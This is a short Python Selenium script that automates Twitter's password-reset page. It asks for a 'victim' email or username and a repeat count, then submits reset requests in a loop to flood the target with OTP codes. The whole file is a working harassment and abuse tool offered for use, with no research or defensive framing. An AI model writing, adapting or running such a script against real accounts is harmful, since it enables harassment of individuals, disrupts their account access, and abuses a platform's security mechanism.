from selenium.webdriver.common.by import By
from selenium import webdriver as wd
import time

n = int(input("How many times OTP from Twitter ?  : "))
target = input("Enter the email id or username of victim : ")

for x in range(n):
	browser = wd.Chrome('chromedriver.exe')
	browser.get(r"https://twitter.com/account/begin_password_reset")

	ph_number = browser.find_element(By.NAME, r'account_identifier')
	submit = browser.find_element(By.XPATH, "/html/body/div[2]/div/form/input[3]")
	time.sleep(5)

	ph_number.send_keys(target)
	submit.click()
	time.sleep(5)
				
	reset_btn = browser.find_element(By.XPATH, '/html/body/div[2]/div/form/input[2]')
	reset_btn.click()
	time.sleep(5)

	browser.close()